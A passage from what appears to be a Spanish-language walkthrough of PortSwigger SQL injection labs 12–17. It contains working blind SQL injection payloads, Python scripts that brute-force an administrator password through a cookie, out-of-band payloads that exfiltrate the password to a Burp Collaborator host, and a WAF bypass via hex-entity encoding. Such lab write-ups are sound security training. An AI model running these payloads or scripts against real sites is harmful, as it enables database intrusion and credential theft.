</span></span><span class="line"><span class="cl">			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="s2">&#34;Welcome back!&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">				<span class="n">password</span> <span class="o">+=</span> <span class="n">character</span>
</span></span><span class="line"><span class="cl">				<span class="n">p2</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">makeRequest</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 12: Blind SQL injection with conditional errors</th>
</tr>
</thead>
</table></div>
<p>En este laboratorio no vamos a ver mensajes de respuesta pero si vamos a ver códigos de estados como el 500 internal server error o el 200 ok. El camp inyectable es otra vez en la cookie, por lo que si tiramos de burpsuite será mas cómodo.</p>
<p>Si probamos querys básicas que hemos estado utilizando durante todos los laboratorios de portswigger vamos a ver que a veces nos salta el 500 internal server error y otra el 200 ok.
Esto nos puede descuadrar un poco, pero lo que tenemos que hacer es seguir probando y ver con que tipo de base de datos nos estamos topando(MySql, Microsoft, Oracle, etc).</p>
<p>Como la query que se esta tratando por detrás es algo así:
SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;;
Vamos a probar una manera de poder mandar la query correctamente, concatenado querys con los || como en uno de los laboratorios que hicimos anteriormente.
SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;||(select &lsquo;&rsquo;)||&rsquo;&rsquo;;
De la siguiente manera vamos a ver que estamos tratando con una base de datos Oracle gracias a la tabla &lsquo;dual&rsquo;</p>
<p><code>TrackingId = xxxxxxxxx'||(select '' from dual)||';</code></p>
<p>Ahora para poder ver si la tabla existe lo podemos comprobar de la siguiente manera. ROWNUM para quedarnos con una única fila en la respuesta:</p>
<p><code>TrackingId = xxxxxxxxx'||(select '' from users where rownum=1)||';</code></p>
<p>De la siguiente manera vamos a crear una query en la que podamos generar el error 500 internal server error y el 200 ok a nuestro antojo y así aprovecharnos de eso para poder conseguir la contraseña. Pero antes de ir a por la contraseña vamos a ver un ejemplo de como se haría.</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||';</code></p>
<p>La idea de esta query es generar un conflicto y poder ver el 500 internal server error. Para ello el &ldquo;to_char(1/0)&rdquo;, aunque también hay mas maneras de producirlo con esta misa query como veremos más adelante.
Leemos la query de derecha a izquierda, así que como el usuario administrator&rsquo; existe en la tabla users se procede a entrar en el case y se produce lo siguiente: si 1 es igual a 1 entonces hace la operatoria del &rsquo;to_char()&rsquo; y como da conflicto nos muestra el 500 internal server error, por lo que gracias a esto sabemos que el usuario administrador existe para la tabla users.</p>
<p>Ahora el caso opuesto para entenderlo mejor:</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when (2=1) then to_char(1/0) else '' end from users where username='administrator')||';</code></p>
<p>Aquí como 2 no es igual a 1 no va a entrar en la operatoria del &rsquo;then to_char()&rsquo;, sino que se va a ir al &ldquo;else&rsquo;&rsquo;&rdquo;, y como este no produce nada nos debería salir el 200 ok.</p>
<p>Entonces imaginemos que ponemos como usuario uno que no exista, como por ejemplo &lsquo;administrat&rsquo;:</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrat')||';</code></p>
<p>Por tanto como el usuario no existe en esta tabla no procede a hacer toda la operatoria siguiente por lo que nos debería salir el 200 ok.
A si que lo que nosotros estamos buscando desde un principio es ver el estado 500 no el 200, aunque también se puede de la otra manera</p>
<p>En este caso lo que vamos a tratar es buscar una manera de poder ir iterando sobre los caracteres de usuario estando ya filtrando por el usuario administrador. Por lo que el primer carácter es una &lsquo;a&rsquo; por lo que quedaría &lsquo;a&rsquo;=&lsquo;a&rsquo; y entonces se produciría el intencionado 500 internal server error.</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when substr(username,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||';</code></p>
<p>Para sacar la contraseña es el mismo procedimiento pero en vez de sacar los caracteres para username los sacamos para password:</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||';</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">pdb</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Ctrl+C</span>
</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main_url</span> <span class="o">=</span> <span class="s2">&#34;url de la web&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">makeRequest</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Fuerza bruta&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s2">&#34;Iniciando ataque de fuerza bruta&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">p2</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Password&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">21</span><span class="p">):</span> <span class="c1"># CANTIDA DE CARACTERES QUE TIENE LA PASSWORD</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;TrackingId&#39;</span> <span class="p">:</span> <span class="s2">&#34;xxxxxxxxxxx&#39;||(select case when substr(password,</span><span class="si">%d</span><span class="s2">,1)=&#39;</span><span class="si">%s</span><span class="s2">&#39; then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">character</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;session&#39;</span> <span class="p">:</span> <span class="s1">&#39;xxxxxxxxxxxxx&#39;</span>	 
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;TrackingID&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span> <span class="c1">#CODIGO DE ESTADO</span>
</span></span><span class="line"><span class="cl">				<span class="n">password</span> <span class="o">+=</span> <span class="n">character</span>
</span></span><span class="line"><span class="cl">				<span class="n">p2</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">makeRequest</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 13: Blind SQL injection with time delays</th>
</tr>
</thead>
</table></div>
<p>En este laboratorio hay que conseguir que la web tarde 10s en responder.En este caso vamos a estar tratando con una base de datos PostgresSQL.</p>
<p>El campo inyectable sigue siendo la cookie TrackingId, y ya no vamos a ver nada de respuesta ni errores que nos hagan ver si vamos por buen camino o no.</p>
<p>La forma en la que PostgresSQL de hacer que la web en este caso tarde 10s en responder seria de la siguiente manera:</p>
<p><code>TrackingId = xxxxxxxxx'||pg_sleep(10)-- -;</code></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 14: Blind SQL injection with time delays and information retrieval</th>
</tr>
</thead>
</table></div>
<p>En este laboratorio vamos a tratar de sacar la contraseña del usuario administrador gracias al tiempo de respuesta de la web, como en el laboratorio anterior.</p>
<p>Lo que vamos a tratar de hacer con esta query es algo similar a la que hicimos en el Lab12, simplemente cuando una condición se cumpla con los filtro que apliquemos la respuesta del servidor será de 5s, de lo contrario la respuesta será inmediata.</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -;</code></p>
<p>Ahora podríamos intentar averiguar de igual manera la longitud de la contraseña.</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and length(password)&gt;=20)-- -;</code></p>
<p>Lo siguiente ya seria sacar los caracteres que componen la contraseña con la función que hicimos antes pero en vez de ser &lsquo;substr()&rsquo; que es para ORACLE ahora usaremos &lsquo;substring()&rsquo;, en donde tendremos que ir iterando sobre el carácter &lsquo;a&rsquo; y sobre la posición para este carácter que en este caso sería &lsquo;1&rsquo;.</p>
<p><code>TrackingId = xxxxxxxxx'||(select case when substring(password,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -;</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">pdb</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Ctrl+C</span>
</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main_url</span> <span class="o">=</span> <span class="s2">&#34;url de la web&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">makeRequest</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Fuerza bruta&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s2">&#34;Iniciando ataque de fuerza bruta&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">p2</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Password&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">21</span><span class="p">):</span> <span class="c1"># CANTIDA DE CARACTERES QUE TIENE LA PASSWORD</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;TrackingId&#39;</span> <span class="p">:</span> <span class="s2">&#34;xxxxxxxxxxx&#39;||(select case when substring(password,</span><span class="si">%d</span><span class="s2">,1)=&#39;</span><span class="si">%s</span><span class="s2">&#39; then pg_sleep(5) else pg_sleep(0) end from users where username=&#39;administrator&#39;)-- -&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">character</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">				<span class="s1">&#39;session&#39;</span> <span class="p">:</span> <span class="s1">&#39;xxxxxxxxxxxxx&#39;</span>	 
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;TrackingID&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">time_start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="c1">#Timepo de entrada que coja la hora actual antes de enviar los datos</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">time_end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="c1">#Tiempo de finalizacion despues de enviar los datos</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="n">time_end</span> <span class="o">-</span> <span class="n">time_start</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">				<span class="n">password</span> <span class="o">+=</span> <span class="n">character</span>
</span></span><span class="line"><span class="cl">				<span class="n">p2</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">makeRequest</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 15: Blind SQL injection with out-of-band interaction</th>
</tr>
</thead>
</table></div>
<p>Suponiendo que es oracle</p>
<p>En este laboratorio hay que tratar de causar un DNS lookup con la herramienta Burp Collaborator.</p>
<p>Para que esto se pueda acontecer hay que irse a la pestaña &lsquo;Burp&rsquo;-&gt;&lsquo;Burp collaborator client&rsquo; le damos a copy to clipboard y después lo ponemos donde &lsquo;burp-colaborator-subdomain&rsquo;. y después urlencodearlo todo.
==TrackingId = xxxxxxxxx&rsquo;||(SELECT EXTRACTVALUE(xmltype(&rsquo;<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]&gt;&rsquo;),&rsquo;/l&rsquo;) FROM dual)&ndash; -==</p>
<p>Después mandamos la petición con el repeater y después volver a la pestaña de &lsquo;Burp collaborator client&rsquo; y darle a &lsquo;pull now&rsquo;, si vemos que hay una petición es que ha funcionado.</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 16: Blind SQL injection with out-of-band data exfiltration</th>
</tr>
</thead>
</table></div>
<p>Suponiendo que es Oracle.</p>
<p>Aquí es simplemente lo mismo, poner el subdominio de burp donde pone &lsquo;burp-collaborator-subdomain&rsquo; y delate de eso donde pone &lsquo;select your query here&rsquo;  hay que poner la query que deseamos ejecutar para poder sacar datos como la contraseña del administrador. Y lo urlencodeamos.</p>
<p><code>TrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- -</code></p>
<p>Por ejemplo:</p>
<p><code>TrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(select username form users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- -</code></p>
<p>Por lo que en la respuesta vamos a ver la query seguido del subdominio de tal manera:</p>
<p><strong>administrator.XXXXXXXXXXXXX.oastify.com</strong></p>
<p>Pues el mismo caso pero para sacar la contraseña.</p>
<p><code>TrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(select password form users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- -</code></p>
<p>Lo cual se representaria así:</p>
<p><strong>&lsquo;resultadoDeLacontraseña&rsquo;.XXXXXXXXXXXX.oastify.com</strong></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center">LAB 17: SQL injection with filter bypass via XML enconding</th>
</tr>
</thead>
</table></div>
<p>El objetivo de este laboratorio es bypassear el WAF que nos bloquea a la hora de hacer la inyección. Aquí la vulnerabilidad se encuentra en &lsquo;stock check feature&rsquo;.
Para ese laboratorio vamos a necesitar el &lsquo;HackVertor&rsquo;, para ellos nos vamos a la pestaña extender y ahí buscamos esta extensión del burpsuite.</p>
<p>En el burpsuite veremos esta estructura XML:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">enconding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">	&lt;stockCheck&gt;
</span></span><span class="line"><span class="cl">		&lt;productId&gt;
</span></span><span class="line"><span class="cl">			<span class="m">2</span>
</span></span><span class="line"><span class="cl">		&lt;/productId&gt;
</span></span><span class="line"><span class="cl">		&lt;storeId&gt;
</span></span><span class="line"><span class="cl">			<span class="m">1</span>
</span></span><span class="line"><span class="cl">		&lt;/storeId&gt;
</span></span><span class="line"><span class="cl">	&lt;/stockCheck&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>A si que vamos a probar una inyección para ver que pasa.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">enconding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">	&lt;stockCheck&gt;
</span></span><span class="line"><span class="cl">		&lt;productId&gt;
</span></span><span class="line"><span class="cl">			<span class="m">2</span>
</span></span><span class="line"><span class="cl">		&lt;/productId&gt;
</span></span><span class="line"><span class="cl">		&lt;storeId&gt;
</span></span><span class="line"><span class="cl">			<span class="m">1</span> union <span class="k">select</span> NULL-- -
</span></span><span class="line"><span class="cl">		&lt;/storeId&gt;
</span></span><span class="line"><span class="cl">	&lt;/stockCheck&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Y veremos en la respuesta que nos pone un &ldquo;Attack detected&rdquo;. Por lo que ahora vamos a tratar de bypassear el WAF con el &ldquo;HackVertor&rdquo;. Para ellos seleccionamos la línea donde hemos introducido la inyección y damos click derecho, después nos vamos a</p>
<p>&ldquo;Extensions&rdquo;-&gt;&ldquo;HackVertor&rdquo;-&gt;&ldquo;Encode&rdquo;-&gt;&ldquo;hex-entities&rdquo;. Esto se nos representara de la siguiente manera.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">enconding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">	&lt;stockCheck&gt;
</span></span><span class="line"><span class="cl">		&lt;productId&gt;
</span></span><span class="line"><span class="cl">			<span class="m">2</span>
</span></span><span class="line"><span class="cl">		&lt;/productId&gt;
</span></span><span class="line"><span class="cl">		&lt;storeId&gt;
</span></span><span class="line"><span class="cl">			&lt;@hex_entities&gt;
</span></span><span class="line"><span class="cl">				<span class="m">1</span> union <span class="k">select</span> NULL-- -
</span></span><span class="line"><span class="cl">			&lt;@/hex_entities&gt;
</span></span><span class="line"><span class="cl">		&lt;/storeId&gt;
</span></span><span class="line"><span class="cl">	&lt;/stockCheck&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ahora veríamos que ya nos muestra el NULL en la respuesta, por lo que podemos ya tratar de obtener la contraseña del usuario administrador de la siguiente manera.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
